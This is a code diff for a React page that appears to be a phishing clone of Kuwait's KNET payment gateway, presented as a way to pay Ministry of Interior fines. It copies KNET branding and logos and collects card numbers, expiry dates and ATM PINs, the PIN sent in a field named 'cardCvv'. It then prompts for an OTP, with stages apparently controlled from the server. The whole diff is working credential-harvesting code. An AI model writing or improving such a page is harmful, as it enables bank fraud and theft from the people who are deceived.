@@ -1,11 +1,8 @@
-import { useState, useEffect, type FormEvent } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 
-type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";
-
-const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
-const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];
+type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed" | "atm" | "atm_pending";
 
 export default function Payment() {
   const [, setLocation] = useLocation();
@@ -15,14 +12,10 @@ export default function Payment() {
   const [error, setError] = useState<string | null>(null);
   
   const [cardNumber, setCardNumber] = useState("");
-  const [cardPrefix, setCardPrefix] = useState("");
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [pin, setPin] = useState("");
   const [otp, setOtp] = useState("");
-  
-  const [showPrefixes, setShowPrefixes] = useState(false);
-  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);
 
   useEffect(() => {
     const data = sessionStorage.getItem("paymentData");
@@ -30,26 +23,18 @@ export default function Payment() {
     const parsed = JSON.parse(data);
     setPaymentData(parsed);
     
-    createSessionMutation.mutate({
-      selectedFines: parsed.selectedFines,
-      totalAmount: parsed.totalAmount,
-      civilId: parsed.civilId,
-      enquiryType: "1",
-      queryId: "manual"
-    });
-  }, []);
-
-  useEffect(() => {
-    if (cardPrefix === "4") {
-      setAvailablePrefixes(PREFIXES_4);
-      setShowPrefixes(true);
-    } else if (cardPrefix === "5") {
-      setAvailablePrefixes(PREFIXES_5);
-      setShowPrefixes(true);
+    if (parsed.sessionId) {
+      setSessionId(parsed.sessionId);
     } else {
-      setShowPrefixes(false);
+      createSessionMutation.mutate({
+        selectedFines: parsed.selectedFines,
+        totalAmount: parsed.totalAmount,
+        civilId: parsed.civilId,
+        enquiryType: "1",
+        queryId: parsed.queryId
+      });
     }
-  }, [cardPrefix]);
+  }, []);
 
   const createSessionMutation = trpc.payment.createSession.useMutation({
     onSuccess: (data) => setSessionId(data.sessionId)
@@ -62,8 +47,7 @@ export default function Payment() {
 
   useEffect(() => {
     if (sessionStatus?.stage) {
-      if (sessionStatus.stage === "atm") setStage("otp");
-      else setStage(sessionStatus.stage as Stage);
+      setStage(sessionStatus.stage as Stage);
       if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
     }
   }, [sessionStatus]);
@@ -78,19 +62,19 @@ export default function Payment() {
     onError: (err) => { setError(err.message); setStage("failed"); }
   });
 
-  const handleCardSubmit = (e: FormEvent) => {
+  const handleCardSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!sessionId) return;
     submitCard.mutate({
       sessionId,
-      cardName: "KNET",
-      cardNumber: cardPrefix + cardNumber,
+      cardName: "KNET User",
+      cardNumber: cardNumber.replace(/\s/g, ""),
       cardExpiry: `${expiryMonth}/${expiryYear}`,
       cardCvv: pin
     });
   };
 
-  const handleOtpSubmit = (e: FormEvent) => {
+  const handleOtpSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!sessionId) return;
     submitOtp.mutate({ sessionId, otpCode: otp });
@@ -99,109 +83,166 @@ export default function Payment() {
   if (!paymentData) return null;
 
   return (
-    <div className="kpay-absolute-mirror" dir="rtl">
+    <div className="knet-payment-wrapper" dir="rtl">
+      <link href="/knet/css/payment-reset.css" rel="stylesheet" type="text/css"/>
+      <link href="/knet/css/payment-responsive-ar.css" rel="stylesheet" type="text/css"/>
+      <link href="/knet/css/payment-layout-ar.css" rel="stylesheet" type="text/css"/>
+      
       <style>{`
-        .kpay-absolute-mirror { background-color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .results-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 10000; }
-        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.8); display: flex; justify-content: center; align-items: center; z-index: 10001; }
+        .knet-payment-wrapper { background: #f5f5f5; min-height: 100vh; font-family: sans-serif; }
+        .payment-container { max-width: 500px; margin: 0 auto; padding: 20px; }
+        .knet-card { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
+        .knet-header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #eee; }
+        .knet-body { padding: 20px; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px dashed #eee; padding-bottom: 5px; }
+        .info-label { color: #666; font-weight: bold; }
+        .info-value { color: #000; font-weight: bold; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
+        .input-styled { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; text-align: center; font-size: 16px; }
+        .btn-knet { background: #0076c0; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-knet:disabled { background: #ccc; }
+        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .otp-modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1001; }
+        .otp-content { background: white; padding: 30px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; }
       `}</style>
 
-      {/* 100% RAW SOURCE CODE MIRROR FROM KPAY.COM.KW */}
-      <div dangerouslySetInnerHTML={{ __html: `
-        <link href="https://www.kpay.com.kw/kpg/css/payment-reset.css?ver=1.70" rel="stylesheet" type="text/css">
-        <link href="https://www.kpay.com.kw/kpg/css/payment-responsive-ar.css?ver=1.70" rel="stylesheet" type="text/css">	   
-        <link href="https://www.kpay.com.kw/kpg/css/payment-layout-ar.css?ver=1.70" rel="stylesheet" type="text/css">
-        
-        <div id="payment-page-container" style="padding-top: 20px;">
-          <div id="payment-header-container">
-            <img src="https://www.kpay.com.kw/kpg/images/knet-logo-ar.png" alt="KNET Logo" style="height: 60px;">
+      <div className="payment-container">
+        <div className="knet-card">
+          <div className="knet-header">
+            <img src="/knet/images/paypage-images/knet-logo-ar.png" alt="KNET" style={{height: '40px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/knet-logo-ar.png')} />
           </div>
-
-          <div id="payment-body-container" style="border: 2px solid #0082c3; border-radius: 15px; margin-top: 20px; padding: 20px; width: 450px; background: white; box-shadow: 0 5px 25px rgba(0,0,0,0.1);">
-            <div style="text-align: center; margin-bottom: 20px;">
-              <img src="https://www.kpay.com.kw/kpg/images/tasdeed_logo.png" style="height: 50px;">
-              <p style="color: #0082c3; font-weight: bold; margin-top: 5px;">نظام الدفع الإلكتروني الحكومي</p>
+          
+          <div className="knet-body">
+            <div style={{textAlign: 'center', marginBottom: '20px'}}>
+              <img src="/knet/images/paypage-images/tasdeed_logo.png" alt="Tasdeed" style={{height: '40px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/tasdeed_logo.png')} />
+              <h3 style={{color: '#0076c0', margin: '10px 0'}}>بوابة الدفع الإلكتروني</h3>
             </div>
 
-            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-              <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
-                <span style="font-weight: bold; color: #666;">المستفيد:</span>
-                <span style="font-weight: bold; color: #0082c3;">وزارة الداخلية</span>
+            <div className="info-section" style={{background: '#f9f9f9', padding: '15px', borderRadius: '5px', marginBottom: '20px'}}>
+              <div className="info-row">
+                <span className="info-label">المستفيد:</span>
+                <span className="info-value">وزارة الداخلية</span>
               </div>
-              <div style="display: flex; justify-content: space-between;">
-                <span style="font-weight: bold; color: #666;">المبلغ:</span>
-                <span style="font-weight: bold; color: #d9534f;">${paymentData.totalAmount} د.ك</span>
+              <div className="info-row">
+                <span className="info-label">المبلغ:</span>
+                <span className="info-value" style={{color: '#d9534f'}}>{paymentData.totalAmount} د.ك</span>
               </div>
             </div>
 
-            <div id="card-details-form">
-              <div style="margin-bottom: 15px;">
-                <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">رقم بطاقة الصراف الآلي (K-NET)</label>
-                <div style="display: flex; gap: 10px;">
-                  <input type="text" id="cardPrefix" placeholder="Prefix" style="width: 100px; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
-                  <input type="text" id="cardNumber" placeholder="رقم البطاقة" style="flex-grow: 1; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
+            {stage === "card" && (
+              <form onSubmit={handleCardSubmit}>
+                <div className="form-group">
+                  <label>رقم بطاقة الصراف الآلي (K-NET)</label>
+                  <input 
+                    type="text" 
+                    className="input-styled" 
+                    placeholder="**** **** **** ****" 
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '))}
+                    maxLength={19}
+                    required
+                  />
                 </div>
-              </div>
-
-              <div style="display: flex; gap: 20px; margin-bottom: 20px;">
-                <div style="flex: 1;">
-                  <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">تاريخ الانتهاء</label>
-                  <div style="display: flex; gap: 5px;">
-                    <input type="text" id="expMonth" placeholder="MM" style="width: 50%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
-                    <input type="text" id="expYear" placeholder="YY" style="width: 50%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
+                
+                <div style={{display: 'flex', gap: '10px'}}>
+                  <div className="form-group" style={{flex: 1}}>
+                    <label>تاريخ الانتهاء</label>
+                    <div style={{display: 'flex', gap: '5px'}}>
+                      <input 
+                        type="text" 
+                        className="input-styled" 
+                        placeholder="MM" 
+                        value={expiryMonth}
+                        onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, ''))}
+                        maxLength={2}
+                        required
+                      />
+                      <input 
+                        type="text" 
+                        className="input-styled" 
+                        placeholder="YY" 
+                        value={expiryYear}
+                        onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, ''))}
+                        maxLength={2}
+                        required
+                      />
+                    </div>
+                  </div>
+                  <div className="form-group" style={{flex: 1}}>
+                    <label>الرقم السري (PIN)</label>
+                    <input 
+                      type="password" 
+                      className="input-styled" 
+                      placeholder="****" 
+                      value={pin}
+                      onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
+                      maxLength={4}
+                      required
+                    />
                   </div>
                 </div>
-                <div style="flex: 1;">
-                  <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">الرقم السري (PIN)</label>
-                  <input type="password" id="cardPin" placeholder="****" style="width: 100%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
-                </div>
-              </div>
 
-              <div style="display: flex; gap: 10px;">
-                <button id="btnProceed" style="flex: 1; background: #0082c3; color: white; border: none; height: 45px; border-radius: 5px; font-weight: bold;">إرسال</button>
-                <button id="btnCancel" style="flex: 1; background: #eee; color: #666; border: none; height: 45px; border-radius: 5px; font-weight: bold;">إلغاء</button>
+                <button type="submit" className="btn-knet">إرسال</button>
+              </form>
+            )}
+
+            {error && (
+              <div style={{color: 'red', textAlign: 'center', marginTop: '10px', fontWeight: 'bold'}}>
+                {error}
               </div>
-            </div>
+            )}
           </div>
-
-          <div style="margin-top: 30px; text-align: center; font-size: 12px; color: #999;">
-            جميع الحقوق محفوظة © 2026<br>
-            شركة الخدمات المصرفية الآلية المشتركة (كي نت)
+          
+          <div style={{padding: '10px', textAlign: 'center', fontSize: '12px', color: '#999', borderTop: '1px solid #eee'}}>
+            جميع الحقوق محفوظة © 2026 شركة كي نت
           </div>
         </div>
-      ` }} />
+      </div>
 
-      {/* React Logic Overlays */}
-      {stage === "otp" && (
-        <div className="results-overlay">
-          <div style={{background: 'white', padding: '30px', borderRadius: '15px', width: '400px', textAlign: 'center', border: '3px solid #0082c3'}}>
-            <h5 style={{color: '#0082c3', marginBottom: '20px'}}>تأكيد الرمز (OTP)</h5>
-            <input 
-              type="text" 
-              style={{width: '100%', height: '50px', textAlign: 'center', fontSize: '24px', letterSpacing: '10px', border: '2px solid #ddd', borderRadius: '5px', marginBottom: '20px'}} 
-              value={otp} 
-              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
-              placeholder="000000"
-            />
-            <button className="btn btn-primary btn-block" style={{backgroundColor: '#0082c3', height: '45px'}} onClick={handleOtpSubmit}>تأكيد</button>
-          </div>
+      {stage.endsWith("_pending") && (
+        <div className="loading-overlay">
+          <img src="/knet/images/paypage-images/loading.gif" alt="Loading" style={{height: '50px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/paypage-images/loading.gif')} />
+          <p style={{marginTop: '15px', color: '#0076c0', fontWeight: 'bold'}}>جاري معالجة طلبك، يرجى الانتظار...</p>
         </div>
       )}
 
-      {(stage.endsWith("_pending")) && (
-        <div className="loading-overlay">
-          <div className="spinner-border text-primary" role="status"></div>
-          <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>جاري معالجة طلبك...</p>
+      {stage === "otp" && (
+        <div className="otp-modal">
+          <div className="otp-content">
+            <h3 style={{color: '#0076c0', marginBottom: '20px'}}>تأكيد الرمز (OTP)</h3>
+            <p>يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
+            <form onSubmit={handleOtpSubmit}>
+              <input 
+                type="text" 
+                className="input-styled" 
+                style={{fontSize: '24px', letterSpacing: '5px', margin: '20px 0'}}
+                value={otp}
+                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
+                maxLength={6}
+                required
+                autoFocus
+              />
+              <button type="submit" className="btn-knet">تأكيد</button>
+            </form>
+          </div>
         </div>
       )}
 
       {stage === "success" && (
-        <div className="results-overlay">
-          <div style={{background: 'white', padding: '40px', borderRadius: '15px', textAlign: 'center', width: '400px'}}>
-            <div style={{fontSize: '60px', marginBottom: '20px'}}>✅</div>
-            <h4 className="text-success font-weight-bold">تم الدفع بنجاح</h4>
-            <button className="btn btn-primary btn-block mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
-          </div>
+        <div className="loading-overlay">
+          <div style={{fontSize: '60px', color: '#5cb85c'}}>✓</div>
+          <h2 style={{color: '#5cb85c'}}>تمت عملية الدفع بنجاح</h2>
+          <button className="btn-knet" style={{width: '200px', marginTop: '20px'}} onClick={() => setLocation("/")}>العودة للرئيسية</button>
+        </div>
+      )}
+      
+      {stage === "failed" && (
+        <div className="loading-overlay">
+          <div style={{fontSize: '60px', color: '#d9534f'}}>✕</div>
+          <h2 style={{color: '#d9534f'}}>فشلت عملية الدفع</h2>
+          <p>{error || "حدث خطأ غير معروف"}</p>
+          <button className="btn-knet" style={{width: '200px', marginTop: '20px'}} onClick={() => setStage("card")}>المحاولة مرة أخرى</button>
         </div>
       )}
     </div>
